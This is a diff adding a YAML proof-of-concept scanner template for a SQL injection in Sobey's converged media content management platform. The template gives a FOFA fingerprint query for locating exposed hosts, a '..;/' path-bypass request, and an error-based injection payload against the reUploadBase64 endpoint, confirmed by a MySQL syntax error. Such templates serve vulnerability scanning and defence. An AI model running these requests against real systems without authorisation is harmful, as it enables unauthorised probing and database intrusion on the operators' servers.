@@ -1,0 +1,18 @@
+id: poc-yaml-sobey-imcmp-reuploadbase64-sqli
+info:
+  name: 索贝融合媒体内容管理平台 reUploadBase64 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+requests:
+- method: GET
+  path: /sobey-mchEditor/js/..;/mch/TestInt/reUploadBase64?ids=1&siteCode=1&token=1
+  expression: status_code == 200 && contains(headers,"Sobey") && contains(body,"\"data\":null")
+- method: GET
+  path: /sobey-mchEditor/js/..;/mch/TestInt/reUploadBase64?ids=1')+AND+(SELECT+1+FROM+nonexistent_table)--+-&siteCode=1&token=1
+  expression: status_code == 500 && contains(body,"Sobey") && contains(body,"MySQLSyntaxErrorException")
+    && matches(body,`Table &#39;([0-9a-zA-Z_]+).nonexistent_table&#39;`)
+variables: {}
+transport: http
